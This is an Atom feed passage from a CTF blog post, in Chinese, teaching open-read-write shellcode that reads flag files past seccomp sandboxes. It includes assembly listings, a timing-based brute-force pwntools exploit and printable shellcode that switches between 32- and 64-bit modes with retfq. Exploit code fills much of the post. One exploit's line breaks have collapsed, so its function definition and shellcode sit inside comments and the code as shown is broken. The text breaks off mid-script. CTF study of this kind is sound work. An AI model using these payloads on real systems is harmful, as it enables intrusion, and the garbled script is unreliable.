<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Ky不是枕木</title>
  
  <subtitle>分享学习经验</subtitle>
  <link href="https://kylinxin.github.io/atom.xml" rel="self"/>
  
  <link href="https://kylinxin.github.io/"/>
  <updated>2023-11-26T07:11:28.601Z</updated>
  <id>https://kylinxin.github.io/</id>
  
  <author>
    <name>Kylinxin</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ORW</title>
    <link href="https://kylinxin.github.io/2023/11/26/ORW%20%E9%A2%98%E5%9E%8B/"/>
    <id>https://kylinxin.github.io/2023/11/26/ORW%20%E9%A2%98%E5%9E%8B/</id>
    <published>2023-11-26T15:14:29.000Z</published>
    <updated>2023-11-26T07:11:28.601Z</updated>
    
    <content type="html"><![CDATA[<p>最近复现强网杯2021赛题[shellcode]有感，特意来学习一下有关orw原理中缺少某些函数的情况如何进行ORW<br>禁用沙箱规则我在之前提到过 [[prctl-seccomp]]<br>参考了大佬!<a href="https://www.jianshu.com/p/754b0a2ae353">https://www.jianshu.com/p/754b0a2ae353</a></p><h3 id="普通-ORW"><a href="#普通-ORW" class="headerlink" title="普通 ORW"></a>普通 ORW</h3><ol><li><p>32 位</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs asm">; "/home/orw/flag\x00" 保存到栈上<br>  ; 小端序<br>  ; 要注意给字符串结尾加上 '\x00'<br>  push   0x006761<br>  push   0x6c662f77<br>  push   0x726f2f65<br>  push   0x6d6f682f<br>  ; open("/home/orw/flag", O_RDONLY)<br>  ; #define O_RDONLY 0 <br>  mov eax,5       ; open() 系统调用号是 5<br>  mov ebx,esp ; "/home/orw/flag"<br>  xor ecx,ecx     ; O_RDONLY = 0<br>  xor edx,edx<br>  int 0x80        ; int 80h 会报错<br>  ; 返回 fd 保存到 eax 中<br><br>  ; read(fd, buf, count)<br>  mov ebx,eax     ; fd<br>  mov eax,3       ; read() 的系统调用号是 3<br>  mov ecx,esp     ; buf<br>  mov edx,0x30    ; count<br>  int 0x80<br><br>  ; write(fd, buf, count)<br>  mov eax,4       ; write() 的系统调用号是 4<br>  mov ebx,1       ; fd=1, write到标准输出<br>  mov ecx,esp     ; buf<br>  mov edx,0x30    ; count<br>  int 0x80<br></code></pre></td></tr></tbody></table></figure></li><li><p>64 位<br> (1). 版本一</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs asm">; open("flag", 0)<br>   0:   68 66 6c 61 67          push   0x67616c66<br>   5:   6a 02                   push   0x2<br>   7:   58                      pop    rax<br>   8:   48 89 e7                mov    rdi,rsp<br>   b:   48 31 f6                xor    rsi,rsi<br>   e:   0f 05                   syscall <br><br>   ; read(fd, rsp, 0x20)<br>  10:   48 89 c7                mov    rdi,rax<br>  13:   48 31 c0                xor    rax,rax<br>  16:   48 89 e6                mov    rsi,rsp<br>  19:   6a 20                   push   0x20<br>  1b:   5a                      pop    rdx<br>  1c:   0f 05                   syscall <br><br>   ; write(1, rsp, 0x20)<br>  1e:   6a 01                   push   0x1<br>  20:   58                      pop    rax<br>  21:   6a 01                   push   0x1<br>  23:   5f                      pop    rdi<br>  24:   48 89 e6                mov    rsi,rsp<br>  27:   6a 20                   push   0x20<br>  29:   5a                      pop    rdx<br>  2a:   0f 05                   syscall<br></code></pre></td></tr></tbody></table></figure></li></ol><p>(2). 版本二</p><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs asm">/* push b'flag\x00' */<br>push 0x67616c66<br>/* call open('rsp', 0, 'O_RDONLY') */<br>push (2) /* 2 */<br>pop rax<br>mov rdi, rsp<br>xor esi, esi /* 0 */<br>cdq /* rdx=0 */<br>syscall<br>/* call sendfile(1, 'rax', 0, 2147483647) */<br>mov r10d, 0x7fffffff<br>mov rsi, rax<br>push (40) /* 0x28 */<br>pop rax<br>push 1<br>pop rdi<br>cdq /* rdx=0 */<br>syscall<br></code></pre></td></tr></tbody></table></figure><h3 id="OR-缺-W-例题-2021-蓝帽杯初赛-slient"><a href="#OR-缺-W-例题-2021-蓝帽杯初赛-slient" class="headerlink" title="OR 缺 W (例题: 2021-蓝帽杯初赛-slient)"></a>OR 缺 W (例题: 2021-蓝帽杯初赛-slient)</h3><ol><li>文件</li></ol><blockquote><p>链接：<a href="https://links.jianshu.com/go?to=https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA">https://pan.baidu.com/s/1EiiZNv5GgSX5t9d4eSKQcA</a><br>提取码：a6gt</p></blockquote><p>题目保护如下</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c">┌──(kylinxin🚀LAPTOP-O0CAV6MM)-[/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w]<br>└─✨ checksec chall<br>[*] <span class="hljs-string">'/mnt/e/CTF/PWN/study_path/stackOverflow/orw/orw_no_w/chall'</span><br>    Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Full RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      PIE enabled<br></code></pre></td></tr></tbody></table></figure><p>沙箱保护开启如下，只能允许read，open，禁用了write，那么意味着我们ORW组合技只有OR可以使用</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">Welcome to silent execution-box.<br><br> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x06</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x03</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A == read) <span class="hljs-keyword">goto</span> <span class="hljs-number">0007</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) <span class="hljs-keyword">goto</span> <span class="hljs-number">0008</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW<br> <span class="hljs-number">0008</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL<br></code></pre></td></tr></tbody></table></figure><p>逆向代码分析</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c">  ......<br><span class="hljs-comment">// 逆向代码片段</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"Welcome to silent execution-box."</span>);<br><br>  v3 = getpagesize();<br>  <span class="hljs-comment">// 利用 mmap 函数在 0x10000 处开辟一个 page 的空间</span><br>  v9 = (<span class="hljs-type">int</span>)mmap((<span class="hljs-type">void</span> *)<span class="hljs-number">0x1000</span>, v3, <span class="hljs-number">7</span>, <span class="hljs-number">34</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0LL</span>);<br><br>  read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x40</span>uLL);<br><br>  <span class="hljs-comment">// 设置沙盒</span><br>  prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  prctl(<span class="hljs-number">4</span>, <span class="hljs-number">0LL</span>);<br>  v8 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v8, <span class="hljs-number">2147418112LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_load(v8);<br><br>  <span class="hljs-comment">// 往 &amp;buf 中读入 0x40 字节数据</span><br>  <span class="hljs-comment">// 然后执行这段数据</span><br>  v4 = buf;<br>  ......<br>  *(_OWORD *)v9 = v4;<br>  ((<span class="hljs-type">void</span> (__fastcall *)(__int64, __int64, __int64))v9)(<span class="hljs-number">0xDEADBEEF</span>LL, <span class="hljs-number">0xDEADBEEF</span>LL, <span class="hljs-number">0xDEADBEEF</span>LL);<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>}<br></code></pre></td></tr></tbody></table></figure><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// about mmap (link: https://man7.org/linux/man-pages/man2/mmap.2.html)</span><br><span class="hljs-comment">// 1. SYNOPSIS</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span>;<br><br><span class="hljs-comment">/* 2. DESCRIPTION</span><br><span class="hljs-comment"> mmap() creates a new mapping in the virtual address space of the</span><br><span class="hljs-comment">       calling process.  The starting address for the new mapping is</span><br><span class="hljs-comment">       specified in addr.  The length argument specifies the length of</span><br><span class="hljs-comment">       the mapping (which must be greater than 0).</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">       If addr is NULL, then the kernel chooses the (page-aligned)</span><br><span class="hljs-comment">       address at which to create the mapping; this is the most portable</span><br><span class="hljs-comment">       method of creating a new mapping.  If addr is not NULL, then the</span><br><span class="hljs-comment">       kernel takes it as a hint about where to place the mapping; on</span><br><span class="hljs-comment">       Linux, the kernel will pick a nearby page boundary (but always</span><br><span class="hljs-comment">       above or equal to the value specified by</span><br><span class="hljs-comment">       /proc/sys/vm/mmap_min_addr) and attempt to create the mapping</span><br><span class="hljs-comment">       there.  If another mapping already exists there, the kernel picks</span><br><span class="hljs-comment">       a new address that may or may not depend on the hint.  The</span><br><span class="hljs-comment">       address of the new mapping is returned as the result of the call.</span><br><span class="hljs-comment">......</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></tbody></table></figure><p>由 <code>on Linux, the kernel will pick a nearby page boundary (but always above or equal to the value specified by /proc/sys/vm/mmap_min_addr)</code> 可知：Linux 为 <code>mmap</code> 分配虚拟内存时，总是从最接近 <code>addr</code> 的页边缘开始的，而且保证地址不低于 <code>/proc/sys/vm/mmap_min_addr</code> 所指定的值。<br>可以看到，<code>mmap_min_addr = 65536 = 0x10000</code>，因此刚才判断程序利用 mmap 函数在 0x10000 处开辟一个 page 的空间。</p><figure class="highlight awk"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(kylinxin🚀LAPTOP-O0CAV6MM)-[<span class="hljs-regexp">/mnt/</span>e<span class="hljs-regexp">/CTF/</span>PWN<span class="hljs-regexp">/study_path/</span>stackOverflow<span class="hljs-regexp">/orw/</span>orw_no_w]<br>└─✨ cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/vm/mm</span>ap_min_addr<br><span class="hljs-number">65536</span><br></code></pre></td></tr></tbody></table></figure><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><pre><code>既然不能 `write`，便只能用 `open` 函数打开 flag 文件后将其中保存的 flag 用 `read` 函数读取出来，再逐字节遍历，与所有的打印字符用 `cmp` 进行比较，一个一个字节地爆破出来。详见 EXP。</code></pre><h4 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h4><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-  </span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *  <br><span class="hljs-keyword">import</span> time  <br>  <br>context(arch=<span class="hljs-string">"amd64"</span>, os=<span class="hljs-string">"linux"</span>)  <span class="hljs-comment"># , log_level = "debug")  </span><br>  <br>  <br><span class="hljs-comment"># 判断第 index 个字符是否是 chdef pwn(p, index, ch):  </span><br>    <span class="hljs-comment"># 运行时需要去掉 shellcode 中的注释  </span><br>    <span class="hljs-comment"># ; open(0x10039, 0)  </span><br>    <span class="hljs-comment"># ; 0x10039 这个地址存放文件名  </span><br>    <span class="hljs-comment"># ; fd 存放在 rax    shellcode = """  </span><br>    push <span class="hljs-number">0x10039</span>    pop rdi    xor esi, esi    push <span class="hljs-number">2</span>    pop rax    syscall  <br>    mov rdi, rax    xor eax, eax    push <span class="hljs-number">0x50</span>    pop rdx    push <span class="hljs-number">0x10040</span>    pop rsi    syscall  <br>    loop:    cmp byte ptr[rsi+{<span class="hljs-number">0</span>}], {<span class="hljs-number">1</span>}    jz loop    ret    <span class="hljs-string">""".format(index, ch)  </span><br><span class="hljs-string">    #     ; 此时 rsi 存放的即为保存 flag 的地址  </span><br><span class="hljs-string">    #     ; 检查 flag[index] 是否等于 ch    #     ; 若相等便卡在这个循环里面  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    # 在这里写入文件名  </span><br><span class="hljs-string">    payload = asm(shellcode).ljust(0x40 - 7, 'a') + './flag\x00'  </span><br><span class="hljs-string">    p.sendafter("Welcome to silent execution-box.\n", payload)  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">flag = ""  </span><br><span class="hljs-string">index = 0  </span><br><span class="hljs-string">last = 'a'  </span><br><span class="hljs-string">while True:  </span><br><span class="hljs-string">    # 逐字符爆破  </span><br><span class="hljs-string">    update = False  </span><br><span class="hljs-string">    # 对于每个字符，遍历所有打印字符 (ascii 码从 32 到 127)    for ch in range(32, 127):  </span><br><span class="hljs-string">        sh = process("./chall")  </span><br><span class="hljs-string">        # 远程比较容易断，可以多次连接  </span><br><span class="hljs-string">        '''  </span><br><span class="hljs-string">        for i in range(10):            try:                sh = remote("1.1.1.1", "11111")                break            except:                sleep(3)                continue        '''        pwn(sh, index, ch)  </span><br><span class="hljs-string">        start = time.time()  </span><br><span class="hljs-string">        try:  </span><br><span class="hljs-string">            sh.recv(timeout=2)  </span><br><span class="hljs-string">        except:  </span><br><span class="hljs-string">            pass  </span><br><span class="hljs-string">        end = time.time()  </span><br><span class="hljs-string">        sh.close()  </span><br><span class="hljs-string">        # 测试接收时延，超过一定时限则说明在 pwn() 函数中插入 shellcode 后卡循环了，即 flag 中的第 index 个字符是 ch        if (end - start &gt; 1.5):  </span><br><span class="hljs-string">            flag += chr(ch)  </span><br><span class="hljs-string">            last = chr(ch)  </span><br><span class="hljs-string">            update = True  </span><br><span class="hljs-string">            print("[ flag + 1 !!! ] " + flag)  </span><br><span class="hljs-string">            break  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    assert (update == True)  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    if (last == '}'):  </span><br><span class="hljs-string">        break  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">    index += 1  </span><br><span class="hljs-string">  </span><br><span class="hljs-string">print("flag: " + flag)</span><br></code></pre></td></tr></tbody></table></figure><h3 id="RW-缺-O"><a href="#RW-缺-O" class="headerlink" title="RW 缺 O"></a>RW 缺 O</h3><p>参考资料：<a href="https://links.jianshu.com/go?to=https://xz.aliyun.com/t/6645">shellcode 的艺术</a><br>详情请看文章中的 “六、禁用了system和open，还限制了shellcode字符”，里面用 ex 师傅的一道题目为例。<br>在 ex 师傅的这道题中，程序是 64 位的，禁用了 <code>open</code> 函数，但是允许调用 <code>fstat</code> 函数（该函数的 64 位系统调用号为 5，这个是 <code>open</code> 函数的 32 位系统调用号）。因此，这道题的基本思路就是利用 <code>retfq</code> 汇编指令进行 32 位和 64 位系统格式之间的切换，在 32 位格式下执行 <code>open</code> 函数打开 <code>flag</code> 文件，在 64 位格式下执行输入输出。<br>而且，由于这道题限制输入的 shellcode 必须是可打印字符，在写 shellcode 的时候还需要使用一些技巧，基本思路就是：对于一些（对应的字节码是不可打印字符）的汇编指令，利用可打印字符之间的算术操作（主要是异或）来获取。具体可以参考文章中的 “三、限制字符”。<br>下面是文章中的代码，自己加了一点注释：</p>  <figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#coding:utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">'debug'</span><br>p = process(<span class="hljs-string">'./shellcode'</span>)<br><span class="hljs-comment"># p = remote("nc.eonew.cn","10011")</span><br>p.recvuntil(<span class="hljs-string">"shellcode: "</span>)<br><br>append_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">push ebx</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string">'''</span><br>append = <span class="hljs-string">'''</span><br><span class="hljs-string">/* 机器码: 52 5a */</span><br><span class="hljs-string">push rdx</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string">'''</span><br><br>shellcode_x86 = <span class="hljs-string">'''</span><br><span class="hljs-string">/*fp = open("flag")*/</span><br><span class="hljs-string">mov esp,0x40404140</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* s = "flag" */</span><br><span class="hljs-string">push 0x67616c66</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ebx = &amp;s */</span><br><span class="hljs-string">push esp</span><br><span class="hljs-string">pop ebx</span><br><span class="hljs-string"></span><br><span class="hljs-string">/* ecx = 0 */</span><br><span class="hljs-string">xor ecx,ecx</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov eax,5</span><br><span class="hljs-string">int 0x80</span><br><span class="hljs-string"></span><br><span class="hljs-string">mov ecx,eax</span><br><span class="hljs-string">'''</span><br><br>shellcode_flag = <span class="hljs-string">'''</span><br><span class="hljs-string">/* retfq:  mode_32 -&gt; mode_64*/</span><br><span class="hljs-string">push 0x33</span><br><span class="hljs-string">push 0x40404089</span><br><span class="hljs-string">retfq</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*read(fp,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,rcx</span><br><span class="hljs-string">mov rsi,rsp</span><br><span class="hljs-string">mov rdx,0x70</span><br><span class="hljs-string">xor rax,rax</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*write(1,buf,0x70)*/</span><br><span class="hljs-string">mov rdi,1</span><br><span class="hljs-string">mov rax,1</span><br><span class="hljs-string">syscall</span><br><span class="hljs-string">'''</span><br>shellcode_x86 = asm(shellcode_x86)<br>shellcode_flag = asm(shellcode_flag, arch = <span class="hljs-string">'amd64'</span>, os = <span class="hljs-string">'linux'</span>)<br>shellcode = <span class="hljs-string">''</span><br><br><span class="hljs-comment"># 0x40404040 为32位shellcode地址</span><br>shellcode_mmap = <span class="hljs-string">'''</span><br><span class="hljs-string">/*mmap(0x40404040,0x7e,7,34,0,0)*/</span><br><span class="hljs-string">push 0x40404040 /*set rdi*/</span><br><span class="hljs-string">pop rdi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x7e /*set rsi*/</span><br><span class="hljs-string">pop rsi</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set rdx*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x47</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop rdx</span><br><span class="hljs-string"></span><br><span class="hljs-string">push 0x40 /*set r8*/</span><br><span class="hljs-string">pop rax</span><br><span class="hljs-string">xor al,0x40</span><br><span class="hljs-string">push rax</span><br><span class="hljs-string">pop r8</span><br><span class="hljs-string"></span><br><span class="hljs-string">push rax /*set r9*/</span><br><span class="hljs-string">pop r9</span><br><span class="hljs-string"></span><br><span class="hljs-string">/*syscall*/</span><br><span class="hljs-string">/* syscall 的机器码是 0f 05, 都是不可打印字符. */</span><br><span 